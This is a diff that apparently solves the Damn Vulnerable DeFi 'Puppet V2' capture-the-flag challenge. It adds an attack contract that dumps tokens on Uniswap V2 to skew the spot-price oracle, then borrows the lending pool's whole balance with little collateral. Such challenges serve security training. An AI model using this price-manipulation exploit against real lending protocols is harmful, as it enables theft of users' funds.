@@ -9,6 +9,7 @@ import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUn
 import {WETH} from "solmate/tokens/WETH.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
+import {UniswapV2Library} from "../../src/puppet-v2/UniswapV2Library.sol";
 
 contract PuppetV2Challenge is Test {
     address deployer = makeAddr("deployer");
@@ -59,7 +60,9 @@ contract PuppetV2Challenge is Test {
 
         // Create Uniswap pair against WETH and add liquidity
         token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
-        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}({
+        uniswapV2Router.addLiquidityETH{
+            value: UNISWAP_INITIAL_WETH_RESERVE
+        }({
             token: address(token),
             amountTokenDesired: UNISWAP_INITIAL_TOKEN_RESERVE,
             amountTokenMin: 0,
@@ -98,7 +101,11 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        PuppetV2Attack attack = new PuppetV2Attack{value: 20 ether}(recovery, lendingPool, weth, uniswapV2Router, token);
+        token.transfer(address(attack), PLAYER_INITIAL_TOKEN_BALANCE);
+        console.log(calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE) / 1 ether);
+        attack.pwn();
+        console.log(calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE) / 1 ether);
     }
 
     /**
@@ -108,4 +115,73 @@ contract PuppetV2Challenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
         assertEq(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+
+    function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
+        uint256 depositFactor = 3;
+        return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
+    }
+
+    // Fetch the price from Uniswap v2 using the official libraries
+    function _getOracleQuote(uint256 amount) private view returns (uint256) {
+        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves({
+            factory: address(uniswapV2Factory), tokenA: address(weth), tokenB: address(token)
+        });
+
+        return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
+    }
+}
+
+contract PuppetV2Attack {
+    address recovery;
+    PuppetV2Pool lendingPool;
+    WETH weth;
+    DamnValuableToken token;
+    IUniswapV2Router02 uniswapV2Router;
+
+    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
+    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
+
+    constructor(
+        address _recovery,
+        PuppetV2Pool _lendingPool,
+        WETH _weth,
+        IUniswapV2Router02 _uniswapV2Router,
+        DamnValuableToken _token
+    ) payable {
+        recovery = _recovery;
+        lendingPool = _lendingPool;
+        weth = _weth;
+        uniswapV2Router = _uniswapV2Router;
+        token = _token;
+    }
+
+    function pwn() external {
+        token.approve(address(uniswapV2Router), type(uint256).max);
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        // Dump all player tokens to skew the price heavily in our favor
+        uniswapV2Router.swapExactTokensForETH({
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMin: 0,
+            path: path,
+            to: address(this),
+            deadline: block.timestamp
+        });
+
+        // Wrap just enough ETH (post price manipulation) to satisfy collateral
+        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        weth.deposit{value: depositRequired}();
+        weth.approve(address(lendingPool), depositRequired);
+
+        // Drain the lending pool and send the tokens to the recovery address
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, token.balanceOf(address(this)));
+    }
+
+    receive() external payable {}
 }
